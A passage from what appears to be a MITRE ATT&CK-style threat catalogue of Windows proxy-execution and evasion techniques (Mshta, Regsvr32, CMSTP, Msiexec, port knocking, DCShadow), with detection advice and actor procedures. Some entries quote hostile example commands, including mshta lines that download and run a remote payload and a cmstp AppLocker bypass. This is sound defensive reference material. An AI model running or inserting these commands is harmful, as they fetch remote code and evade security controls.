+Monitor and analyze logs from host-based detection mechanisms, such as Sysmon, for events such as process creations that include or are resulting from parameters associated with invoking programs/commands/files and/or spawning child processes/network connections.
+
+Procedures:
+
+- [G0032] Lazarus Group: Lazarus Group persistence mechanisms have used forfiles.exe to execute .htm files.
+- [S0193] Forfiles: Forfiles can be used to subvert controls and possibly conceal command execution by not directly invoking cmd.
+- [S0379] Revenge RAT: Revenge RAT uses the Forfiles utility to execute commands on the system.
+- [G1039] RedCurl: RedCurl has used pcalua.exe to obfuscate binary execution and remote connections.
+
+
+### T1205.001 - Traffic Signaling: Port Knocking
+
+Description:
+
+Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software. This technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system. The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r , is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.
+
+Detection:
+
+Record network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.
+
+Procedures:
+
+- [S1060] Mafalda: Mafalda can use port-knocking to authenticate itself to another implant called Cryshell to establish an indirect connection to the C2 server.
+- [G0056] PROMETHIUM: PROMETHIUM has used a script that configures the knockd service and firewall to only accept C2 connections from systems that use a specified sequence of knock ports.
+- [S1204] cd00r: cd00r can monitor for a single TCP-SYN packet to be sent in series to a configurable set of ports (200, 80, 22, 53 and 3 in the original code) before opening a port for communication.
+- [S1059] metaMain: metaMain has authenticated itself to a different implant, Cryshell, through a port knocking and handshake procedure.
+
+### T1205.002 - Traffic Signaling: Socket Filters
+
+Description:
+
+Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell. To establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria. Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with Protocol Tunneling. Filters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`. Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.
+
+Detection:
+
+Identify running processes with raw sockets. Ensure processes listed have a need for an open raw socket and are in accordance with enterprise policy.
+
+Procedures:
+
+- [S1161] BPFDoor: BPFDoor uses BPF bytecode to attach a filter to a network socket to view ICMP, UDP, or TCP packets coming through ports 22 (ssh), 80 (http), and 443 (https). When BPFDoor finds a packet containing its “magic” bytes, it parses out two fields and forks itself. The parent process continues to monitor filtered traffic while the child process executes the instructions from the parsed fields.
+- [S1123] PITSTOP: PITSTOP can listen and evaluate incoming commands on the domain socket, created by PITHOOK malware, located at `/data/runtime/cockpit/wd.fd` for a predefined magic byte sequence. PITSTOP can then duplicate the socket for further communication over TLS.
+- [S0587] Penquin: Penquin installs a `TCP` and `UDP` filter on the `eth0` interface.
+
+
+### T1207 - Rogue Domain Controller
+
+Description:
+
+Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys. Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform SID-History Injection and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence.
+
+Detection:
+
+Monitor and analyze network traffic associated with data replication (such as calls to DrsAddEntry, DrsReplicaAdd, and especially GetNCChanges) between DCs as well as to/from non DC hosts. DC replication will naturally take place every 15 minutes but can be triggered by an adversary or by legitimate urgent changes (ex: passwords). Also consider monitoring and alerting on the replication of AD objects (Audit Detailed Directory Service Replication Events 4928 and 4929). Leverage AD directory synchronization (DirSync) to monitor changes to directory state using AD replication cookies. Baseline and periodically analyze the Configuration partition of the AD schema and alert on creation of nTDSDSA objects. Investigate usage of Kerberos Service Principal Names (SPNs), especially those associated with services (beginning with “GC/”) by computers not present in the DC organizational unit (OU). The SPN associated with the Directory Replication Service (DRS) Remote Protocol interface (GUID E3514235–4B06–11D1-AB04–00C04FC2DCD2) can be set without logging. A rogue DC must authenticate as a service using these two SPNs for the replication process to successfully complete.
+
+Procedures:
+
+- [S0002] Mimikatz: Mimikatz’s LSADUMP::DCShadow module can be used to make AD updates by temporarily setting a computer to be a DC.
+
+
+### T1211 - Exploitation for Defense Evasion
+
+Description:
+
+Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them. Adversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for Security Software Discovery. The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection. There have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries , evade security logs , or deploy hidden infrastructure.
+
+Detection:
+
+Exploitation for defense evasion may happen shortly after the system has been compromised to prevent detection during later actions for for additional tools that may be brought in and used. Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the system that might indicate successful compromise, such as abnormal behavior of processes. This could include suspicious files written to disk, evidence of Process Injection for attempts to hide execution or evidence of Discovery.
+
+Procedures:
+
+- [G1047] Velvet Ant: Velvet Ant exploited CVE-2024-20399 in Cisco Switches to which the threat actor was already able to authenticate in order to escape the NX-OS command line interface and gain access to the underlying operating system for arbitrary command execution.
+- [G0007] APT28: APT28 has used CVE-2015-4902 to bypass security features.
+
+
+### T1216.001 - System Script Proxy Execution: PubPrn
+
+Description:
+
+Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the Windows Command Shell via Cscript.exe. For example, the following code publishes a printer within the specified domain: cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com. Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites. To do so, adversaries may set the second script: parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is pubprn.vbs 127.0.0.1 script: This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script. In later versions of Windows (10+), PubPrn.vbs has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to LDAP://, vice the script: moniker which could be used to reference remote code via HTTP(S).
+
+Detection:
+
+Monitor script processes, such as `cscript`, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.
+
+Procedures:
+
+- [G0050] APT32: APT32 has used PubPrn.vbs within execution scripts to execute malware, possibly bypassing defenses.
+
+### T1216.002 - System Script Proxy Execution: SyncAppvPublishingServer
+
+Description:
+
+Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution of malicious PowerShell commands. SyncAppvPublishingServer.vbs is a Visual Basic script associated with how Windows virtualizes applications (Microsoft Application Virtualization, or App-V). For example, Windows may render Win32 applications to users as virtual applications, allowing users to launch and interact with them as if they were installed locally. The SyncAppvPublishingServer.vbs script is legitimate, may be signed by Microsoft, and is commonly executed from `\System32` through the command line via `wscript.exe`. Adversaries may abuse SyncAppvPublishingServer.vbs to bypass PowerShell execution restrictions and evade defensive counter measures by "living off the land." Proxying execution may function as a trusted/signed alternative to directly invoking `powershell.exe`. For example, PowerShell commands may be invoked using: `SyncAppvPublishingServer.vbs "n; {PowerShell}"`
+
+
+### T1218.001 - System Binary Proxy Execution: Compiled HTML File
+
+Description:
+
+Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. CHM content is displayed using underlying components of the Internet Explorer browser loaded by the HTML Help executable program (hh.exe). A custom CHM file containing embedded payloads could be delivered to a victim then triggered by User Execution. CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe.
+
+Detection:
+
+Monitor and analyze the execution and arguments of hh.exe. Compare recent invocations of hh.exe with prior history of known good arguments to determine anomalous and potentially adversarial activity (ex: obfuscated and/or malicious commands). Non-standard process execution trees may also indicate suspicious or malicious behavior, such as if hh.exe is the parent process for suspicious processes and activity relating to other adversarial techniques. Monitor presence and use of CHM files, especially if they are not typically used within an environment.
+
+Procedures:
+
+- [G0049] OilRig: OilRig has used a CHM payload to load and execute another malicious file once delivered to a victim.
+- [G0070] Dark Caracal: Dark Caracal leveraged a compiled HTML file that contained a command to download and run an executable.
+- [G0091] Silence: Silence has weaponized CHM files in their phishing campaigns.
+- [G0096] APT41: APT41 used compiled HTML (.chm) files for targeting.
+- [G0082] APT38: APT38 has used CHM files to move concealed payloads.
+- [S0373] Astaroth: Astaroth uses ActiveX objects for file execution and manipulation.
+
+### T1218.002 - System Binary Proxy Execution: Control Panel
+
+Description:
+
+Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings. Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a CPlApplet function. For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel. Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file. Malicious Control Panel items can be delivered via Phishing campaigns or executed as part of multi-stage malware. Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists. Adversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls. Even when these registered DLLs do not comply with the CPL file specification and do not export CPlApplet functions, they are loaded and executed through its DllEntryPoint when Control Panel is executed. CPL files not exporting CPlApplet are not directly executable.
+
+Detection:
+
+Monitor and analyze activity related to items associated with CPL files, such as the control.exe and the Control_RunDLL and ControlRunDLLAsUser API functions in shell32.dll. When executed from the command line or clicked, control.exe will execute the CPL file (ex: control.exe file.cpl) before Rundll32 is used to call the CPL's API functions (ex: rundll32.exe shell32.dll,Control_RunDLL file.cpl). CPL files can be executed directly via the CPL API function with just the latter Rundll32 command, which may bypass detections and/or execution filters for control.exe. Inventory Control Panel items to locate unregistered and potentially malicious files present on systems: * Executable format registered Control Panel items will have a globally unique identifier (GUID) and registration Registry entries in HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ControlPanel\NameSpace and HKEY_CLASSES_ROOT\CLSID\{GUID}. These entries may contain information about the Control Panel item such as its display name, path to the local file, and the command executed when opened in the Control Panel. * CPL format registered Control Panel items stored in the System32 directory are automatically shown in the Control Panel. Other Control Panel items will have registration entries in the CPLs and Extended Properties Registry keys of HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Control Panel. These entries may include information such as a GUID, path to the local file, and a canonical name used to launch the file programmatically ( WinExec("c:\windows\system32\control.exe {Canonical_Name}", SW_NORMAL);) or from a command line (control.exe /name {Canonical_Name}). * Some Control Panel items are extensible via Shell extensions registered in HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Controls Folder\{name}\Shellex\PropertySheetHandlers where {name} is the predefined name of the system item. Analyze new Control Panel items as well as those present on disk for malicious content. Both executable and CPL formats are compliant Portable Executable (PE) images and can be examined using traditional tools and methods, pending anti-reverse-engineering techniques.
+
+Procedures:
+
+- [S0260] InvisiMole: InvisiMole can register itself for execution and persistence via the Control Panel.
+- [S0172] Reaver: Reaver drops and executes a malicious CPL file as its payload.
+
+### T1218.003 - System Binary Proxy Execution: CMSTP
+
+Description:
+
+Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections. Adversaries may supply CMSTP.exe with INF files infected with malicious commands. Similar to Regsvr32 / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs and/or COM scriptlets (SCT) from remote servers. This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft. CMSTP.exe can also be abused to Bypass User Account Control and execute arbitrary commands from a malicious INF through an auto-elevated COM interface.
+
+Detection:
+
+Use process monitoring to detect and analyze the execution and arguments of CMSTP.exe. Compare recent invocations of CMSTP.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Sysmon events can also be used to identify potential abuses of CMSTP.exe. Detection strategy may depend on the specific adversary procedure, but potential rules include: * To detect loading and execution of local/remote payloads - Event 1 (Process creation) where ParentImage contains CMSTP.exe and/or Event 3 (Network connection) where Image contains CMSTP.exe and DestinationIP is external. * To detect Bypass User Account Control via an auto-elevated COM interface - Event 10 (ProcessAccess) where CallTrace contains CMLUA.dll and/or Event 12 or 13 (RegistryEvent) where TargetObject contains CMMGR32.exe. Also monitor for events, such as the creation of processes (Sysmon Event 1), that involve auto-elevated CMSTP COM interfaces such as CMSTPLUA (3E5FC7F9-9A51-4367-9063-A120244FBEC7) and CMLUAUTIL (3E000D72-A845-4CD9-BD83-80C07C3B881F).
+
+Procedures:
+
+- [S1149] CHIMNEYSWEEP: CHIMNEYSWEEP can use CMSTP.exe to install a malicious Microsoft Connection Manager Profile.
+- [G0069] MuddyWater: MuddyWater has used CMSTP.exe and a malicious INF to execute its POWERSTATS payload.
+- [S1202] LockBit 3.0: LockBit 3.0 can attempt a CMSTP UAC bypass if it does not have administrative privileges.
+- [G0080] Cobalt Group: Cobalt Group has used the command cmstp.exe /s /ns C:\Users\ADMINI~W\AppData\Local\Temp\XKNqbpzl.txt to bypass AppLocker and launch a malicious script.
+
+### T1218.004 - System Binary Proxy Execution: InstallUtil
+
+Description:
+
+Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: C:\Windows\Microsoft.NET\Framework\v\InstallUtil.exe and C:\Windows\Microsoft.NET\Framework64\v\InstallUtil.exe. InstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute [System.ComponentModel.RunInstaller(true)].
+
+Detection:
+
+Use process monitoring to monitor the execution and arguments of InstallUtil.exe. Compare recent invocations of InstallUtil.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after the InstallUtil.exe invocation may also be useful in determining the origin and purpose of the binary being executed.
+
+Procedures:
+
+- [S0631] Chaes: Chaes has used Installutill to download content.
+- [G0129] Mustang Panda: Mustang Panda has used InstallUtil.exe to execute a malicious Beacon stager.
+- [S0689] WhisperGate: WhisperGate has used `InstallUtil.exe` as part of its process to disable Windows Defender.
+- [S1155] Covenant: Covenant can create launchers via an InstallUtil XML file to install new Grunt listeners.
+- [G0045] menuPass: menuPass has used InstallUtil.exe to execute malicious software.
+- [S1018] Saint Bot: Saint Bot had used `InstallUtil.exe` to download and deploy executables.
+
+### T1218.005 - System Binary Proxy Execution: Mshta
+
+Description:
+
+Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. Files may be executed by mshta.exe through an inline script: mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")")) They may also be executed directly from URLs: mshta http[:]//webserver/payload[.]hta Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.
+
+Detection:
+
+Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed. Monitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious
+
+Procedures:
+
+- [G0121] Sidewinder: Sidewinder has used mshta.exe to execute malicious payloads.
+- [G0032] Lazarus Group: Lazarus Group has used mshta.exe to execute HTML pages downloaded by initial access documents.
+- [S0250] Koadic: Koadic can use mshta to serve additional payloads and to help schedule tasks for persistence.
+- [G0069] MuddyWater: MuddyWater has used mshta.exe to execute its POWERSTATS payload and to pass a PowerShell one-liner for execution.
+- [S0341] Xbash: Xbash can use mshta for executing scripts.
+- [G0129] Mustang Panda: Mustang Panda has used mshta.exe to launch collection scripts.
+- [S0414] BabyShark: BabyShark has used mshta.exe to download and execute applications from a remote server.
+- [G0140] LazyScripter: LazyScripter has used `mshta.exe` to execute Koadic stagers.
+- [S0223] POWERSTATS: POWERSTATS can use Mshta.exe to execute additional payloads on compromised hosts.
+- [G1018] TA2541: TA2541 has used `mshta` to execute scripts including VBS.
+- [S1213] Lumma Stealer: Lumma Stealer has used mshta.exe to execute additional content.
+- [G0082] APT38: APT38 has used a renamed version of `mshta.exe` to execute malicious HTML files.
+- [S0455] Metamorfo: Metamorfo has used mshta.exe to execute a HTA payload.
+- [G0100] Inception: Inception has used malicious HTA files to drop and execute malware.
+- [G0094] Kimsuky: Kimsuky has used mshta.exe to run malicious scripts on the system.
+- [G0046] FIN7: FIN7 has used mshta.exe to execute VBScript to execute malicious code on victim systems.
+- [S0379] Revenge RAT: Revenge RAT uses mshta.exe to run malicious scripts on the system.
+- [G1006] Earth Lusca: Earth Lusca has used `mshta.exe` to load an HTA script within a malicious .LNK file.
+- [G0050] APT32: APT32 has used mshta.exe for code execution.
+- [S0228] NanHaiShu: NanHaiShu uses mshta.exe to load its program and files.
+- [S0589] Sibot: Sibot has been executed via MSHTA application.
+- [C0016] Operation Dust Storm: During Operation Dust Storm, the threat actors executed JavaScript code via `mshta.exe`.
+- [G0016] APT29: APT29 has use `mshta` to execute malicious scripts on a compromised host.
+- [G0142] Confucius: Confucius has used mshta.exe to execute malicious VBScript.
+- [S1155] Covenant: Covenant can create HTA files to install Grunt listeners.
+- [S0147] Pteranodon: Pteranodon can use mshta.exe to execute an HTA file hosted on a remote server.
+- [G0127] TA551: TA551 has used mshta.exe to execute malicious payloads.
+- [G1008] SideCopy: SideCopy has utilized `mshta.exe` to execute a malicious hta file.
+- [G0047] Gamaredon Group: Gamaredon Group has used `mshta.exe` to execute malicious files.
+- [C0015] C0015: During C0015, the threat actors used `mshta` to execute DLLs.
+
+### T1218.007 - System Binary Proxy Execution: Msiexec
+
+Description:
+
+Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi). The Msiexec.exe binary may also be digitally signed by Microsoft. Adversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs. Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the AlwaysInstallElevated policy is enabled.
+
+Detection:
+
+Use process monitoring to monitor the execution and arguments of msiexec.exe. Compare recent invocations of msiexec.exe with prior history of known good arguments and executed MSI files or DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of msiexec.exe may also be useful in determining the origin and purpose of the MSI files or DLLs being executed.
+
+Procedures:
+
+- [S0631] Chaes: Chaes has used .MSI files as an initial way to start the infection chain.
+- [G0021] Molerats: Molerats has used msiexec.exe to execute an MSI payload.
+- [S0038] Duqu: Duqu has used msiexec to execute malicious Windows Installer packages. Additionally, a PROPERTY=VALUE pair containing a 56-bit encryption key has been used to decrypt the main payload from the installer packages.
+- [S0455] Metamorfo: Metamorfo has used MsiExec.exe to automatically execute files.
+- [S1160] Latrodectus: Latrodectus has called `msiexec` to install remotely-hosted MSI files.
+- [S1052] DEADEYE: DEADEYE can use `msiexec.exe` for execution of malicious DLL.
+- [S0483] IcedID: IcedID can inject itself into a suspended msiexec.exe process to send beacons to C2 while appearing as a normal msi application. IcedID has also used msiexec.exe to deploy the IcedID loader.
+- [S1122] Mispadu: Mispadu has been installed via MSI installer.
+- [S0662] RCSession: RCSession has the ability to execute inside the msiexec.exe process.
+- [G0092] TA505: TA505 has used msiexec to download and execute malicious Windows Installer files.
+- [S0530] Melcoz: Melcoz can use MSI files with embedded VBScript for execution.
+- [S0650] QakBot: QakBot can use MSIExec to spawn multiple cmd.exe processes.
+- [S0531] Grandoreiro: Grandoreiro can use MSI files to execute DLLs.
+- [S0584] AppleJeus: AppleJeus has been installed via MSI installer.
+- [S0528] Javali: Javali has used the MSI installer to download and execute malicious payloads.
+- [S0481] Ragnar Locker: Ragnar Locker has been delivered as an unsigned MSI package that was executed with msiexec.exe.
+- [C0047] RedDelta Modified PlugX Infection Chain Operations: Mustang Panda initial payloads downloaded a Windows Installer MSI file that in turn dropped follow-on files leading to installation of PlugX during RedDelta Modified PlugX Infection Chain Operations.
+- [G0075] Rancor: Rancor has used msiexec to download and execute malicious installer files over HTTP.
+- [G0128] ZIRCONIUM: ZIRCONIUM has used the msiexec.exe command-line utility to download and execute malicious MSI files.
+- [G0095] Machete: Machete has used msiexec to install the Machete malware.
+- [S1130] Raspberry Robin: Raspberry Robin uses msiexec.exe for post-installation communication to command and control infrastructure. Msiexec.exe is executed referencing a remote resource for second-stage payload retrieval and execution.
+- [G0082] APT38: APT38 has used `msiexec.exe` to execute malicious files.
+- [S0451] LoudMiner: LoudMiner used an MSI installer to install the virtualization software.
+- [S0449] Maze: Maze has delivered components for its ransomware attacks using MSI files, some of which have been executed from the command-line using msiexec.
+- [S0592] RemoteUtilities: RemoteUtilities can use Msiexec to install a service.
+- [S0381] FlawedAmmyy: FlawedAmmyy has been installed via `msiexec.exe`.
+- [S0611] Clop: Clop can use msiexec.exe to disable security tools on the system.
+
+### T1218.008 - System Binary Proxy Execution: Odbcconf
+
+Description:
+
+Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names. The Odbcconf.exe binary may be digitally signed by Microsoft. Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to Regsvr32, odbcconf.exe has a REGSVR flag that can be misused to execute DLLs (ex: odbcconf.exe /S /A &lbrace;REGSVR "C:\Users\Public\file.dll"&rbrace;).
+
+Detection:
+
+Use process monitoring to monitor the execution and arguments of odbcconf.exe. Compare recent invocations of odbcconf.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of odbcconf.exe may also be useful in determining the origin and purpose of the DLL being loaded.
+
+Procedures:
+
+- [G0080] Cobalt Group: Cobalt Group has used odbcconf to proxy the execution of malicious DLL files.
+- [S1039] Bumblebee: Bumblebee can use `odbcconf.exe` to run DLLs on targeted hosts.
+- [S1130] Raspberry Robin: Raspberry Robin uses the Windows utility odbcconf.exe to execute malicious commands, using the regsvr flag to execute DLLs and bypass application control mechanisms that are not monitoring for odbcconf.exe abuse.
+
+### T1218.009 - System Binary Proxy Execution: Regsvcs/Regasm
+
+Description:
+
+Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are binaries that may be digitally signed by Microsoft. Both utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: [ComRegisterFunction] or [ComUnregisterFunction] respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute.
+
+Detection:
+
+Use process monitoring to monitor the execution and arguments of Regsvcs.exe and Regasm.exe. Compare recent invocations of Regsvcs.exe and Regasm.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after Regsvcs.exe or Regasm.exe invocation may also be useful in determining the origin and purpose of the binary being executed.
+
+Procedures:
+
+- [S0331] Agent Tesla: Agent Tesla has dropped RegAsm.exe onto systems for performing malicious activity.
+
+### T1218.010 - System Binary Proxy Execution: Regsvr32
+
+Description:
+
+Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. This variation of the technique is often referred to as a "Squiblydoo" and has been used in campaigns targeting governments. Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via Component Object Model Hijacking.
+
+Detection:
+
+Use process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded.
+
+Procedures:
+
+- [S1018] Saint Bot: Saint Bot has used `regsvr32` to execute scripts.
+- [S0650] QakBot: QakBot can use Regsvr32 to execute malicious DLLs.
+- [G0127] TA551: TA551 has used regsvr32.exe to load malicious DLLs.
+- [S0367] Emotet: Emotet uses RegSvr32 to execute the DLL payload.
+- [S0229] Orz: Some Orz versions have an embedded DLL known as MockDll that uses Process Hollowing and regsvr32 to execute another payload.
+- [S0250] Koadic: Koadic can use Regsvr32 to execute additional payloads.
+- [S0476] Valak: Valak has used regsvr32.exe to launch malicious DLLs.
+- [S1030] Squirrelwaffle: Squirrelwaffle has been executed using `regsvr32.exe`.
+- [S1047] Mori: Mori can use `regsvr32.exe` for DLL execution.
+- [S1155] Covenant: Covenant can create SCT files for installation via `Regsvr32` to deploy new Grunt listeners.
+- [S0373] Astaroth: Astaroth can be loaded through regsvr32.exe.
+- [S0384] Dridex: Dridex can use `regsvr32.exe` to initiate malicious code.
+- [S1130] Raspberry Robin: Raspberry Robin uses regsvr32.exe execution without any command line parameters for command and control requests to IP addresses associated with Tor nodes.
+- [S0021] Derusbi: Derusbi variants have been seen that use Registry persistence to proxy execution through regsvr32.exe.
+- [G0009] Deep Panda: Deep Panda has used regsvr32.exe to execute a server variant of Derusbi in victim networks.
+- [S0270] RogueRobin: RogueRobin uses regsvr32.exe to run a .sct file for execution.
+- [G0080] Cobalt Group: Cobalt Group has used regsvr32.exe to execute scripts.
+- [C0022] Operation Dream Job: During Operation Dream Job, Lazarus Group used `regsvr32` to execute malware.
+- [S0481] Ragnar Locker: Ragnar Locker has used regsvr32.exe to execute components of VirtualBox.
+- [G0108] Blue Mockingbird: Blue Mockingbird has executed custom-compiled XMRIG miner DLLs using regsvr32.exe.
+- [S0698] HermeticWizard: HermeticWizard has used `regsvr32.exe /s /i` to execute malicious payloads.
+- [S0554] Egregor: Egregor has used regsvr32.exe to execute malicious DLLs.
+- [C0015] C0015: During C0015, the threat actors employed code that used `regsvr32` for execution.
+- [G0065] Leviathan: Leviathan has used regsvr32 for execution.
+- [G0094] Kimsuky: Kimsuky has executed malware with regsvr32s.
+- [G0100] Inception: Inception has ensured persistence at system boot by setting the value regsvr32 %path%\ctfmonrn.dll /s.
+- [G0090] WIRTE: WIRTE has used `regsvr32.exe` to trigger the execution of a malicious script.
+- [S0284] More_eggs: More_eggs has used regsvr32.exe to execute the malicious DLL.
+- [G0050] APT32: APT32 created a Scheduled Task/Job that used regsvr32.exe to execute a COM scriptlet that dynamically downloaded a backdoor and injected it into memory. The group has also used regsvr32 to run their backdoor.
+- [S0568] EVILNUM: EVILNUM can run a remote scriptlet that drops a file and executes it via regsvr32.exe.
+- [S0087] Hi-Zor: Hi-Zor executes using regsvr32.exe called from the Registry Run Keys / Startup Folder persistence mechanism.
+- [S0622] AppleSeed: AppleSeed can call regsvr32.exe for execution.
+- [S0341] Xbash: Xbash can use regsvr32 for executing scripts.
+- [G0073] APT19: APT19 used Regsvr32 to bypass application control techniques.
+
+### T1218.011 - System Binary Proxy Execution: Rundll32
+
+Description:
+
